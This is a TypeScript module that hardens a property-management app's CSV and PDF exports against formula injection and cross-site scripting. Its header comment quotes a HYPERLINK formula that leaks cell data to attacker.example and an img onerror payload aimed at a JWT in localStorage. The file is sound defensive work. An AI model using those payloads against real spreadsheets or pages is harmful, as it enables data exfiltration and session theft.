/**
 * Making exported data safe to open.
 *
 * The report exports are built in the browser from API data — tenant names,
 * unit labels, expense descriptions, notes. All of that is typed in at
 * onboarding or data entry, so all of it is attacker-influenced text that ends
 * up in two places that will happily execute it:
 *
 *  1. **A spreadsheet.** A cell beginning `=`, `+`, `-`, `@`, tab or carriage
 *     return is a FORMULA in Excel, LibreOffice and Google Sheets. A tenant
 *     named `=HYPERLINK("https://attacker.example/?d="&A1,"Receipt")` becomes a
 *     live exfiltration link in the landlord's own sheet.
 *
 *  2. **A print window.** `exportPDF` opens `window.open("")` and writes an
 *     HTML string into it. A document created that way inherits the OPENER's
 *     origin, so `<img src=x onerror=...>` in a tenant name runs as the app,
 *     where the JWT lives in localStorage.
 *
 * Both are fixed here rather than at each call site, so a new export cannot
 * quietly reintroduce either.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutralise one CSV cell.
 *
 * Numbers pass through untouched — they come from the API as computed figures,
 * never from user input, and prefixing them would break every SUM in the sheet.
 * Text is prefixed with an apostrophe only when it actually starts with a
 * formula character; every spreadsheet reads that as "this is text" and the
 * displayed value is unchanged.
 *
 * Embedded double quotes are doubled, which is the CSV escape. The previous
 * implementation wrapped each cell in `"` and did nothing else, so a value
 * containing a quote broke the row apart.
 */
export function csvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '""';
  if (typeof value === "number") return `"${value}"`;

  let text = String(value);
  if (FORMULA_PREFIXES.some((prefix) => text.startsWith(prefix))) {
    text = `'${text}`;
  }
  return `"${text.replace(/"/g, '""')}"`;
}

/** Build a whole CSV document from a header row and body rows. */
export function toCsv(
  headers: string[],
  rows: (string | number)[][],
): string {
  return [headers, ...rows].map((row) => row.map(csvCell).join(",")).join("\r\n");
}

/**
 * Escape a value for interpolation into HTML.
 *
 * Deliberately hand-rolled rather than routed through `innerHTML` of a detached
 * node: this runs while BUILDING a string for another document, so there is no
 * DOM to borrow, and a "clever" escape that misses `"` would break out of an
 * attribute.
 */
export function escapeHtml(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
